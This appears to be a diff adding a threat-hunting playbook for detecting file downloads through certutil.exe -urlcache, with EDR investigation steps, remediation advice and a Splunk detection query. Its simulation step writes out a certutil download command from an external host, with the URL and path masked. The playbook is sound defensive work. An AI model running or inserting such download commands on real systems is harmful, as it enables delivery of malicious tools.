@@ -1,0 +1,23 @@
+Title: C&C via Ingres Tool Transfer using certutil
+
+
+Threat Hunt Hypothesis:
+  An adversary may transfer/download tools or other files from an external system into a compromised environment using certutil.exe with the switch urlcache. Certutil.exe is a command-line program, installed as part of Certificate Services. You can use certutil.exe to dump and display certification authority (CA) configuration information, configure Certificate Services, backup and restore CA components, and verify certificates, key pairs, and certificate chains. With urlcache switch included, it is possible to display/delete URL cache entries.
+
+Simulation of Malicious Behavior:
+	--/
+		Step 1: Go to Run
+		Step 2: Type the following without quotes: “cmd /c certutil -urlcache -split -f https://****/****/**** /**** C:\Users\testuser\******.***”
+	/--
+
+Threat Hunt Process:
+  An Endpoint Detection & Response (EDR) solution would be an ideal source for the investigation. In addition to basic host details, EDR also captures information such as command line history and detailed process launch history including process tree. Both of the above pieces of information can help determine the authenticity of the activity.
+	An adversary would leverage the windows native system command line to execute certutil to then download a malicious script/file. EDR would likely have process events generated for these types of actions and would contain information about file downloaded, command line arguments, user, and host information. By corelating this with its relevant parent processes, the request source can be determined which is essential in reaching an investigation conclusion.
+	Any suspicious findings, once verified, should be addressed by; manually removing the script/file manually from the system along with any corresponding running process, the EDR should also be reconfigured to block all future instances of this malicious activity and the system should be reimaged to a known good state.
+
+Reference:
+  https://attack.mitre.org/techniques/T1105/
+  https://attack.mitre.org/software/S0160/
+
+Sample Splunk Query:
+  Event_Name=process AND Command_Line=*certutil*
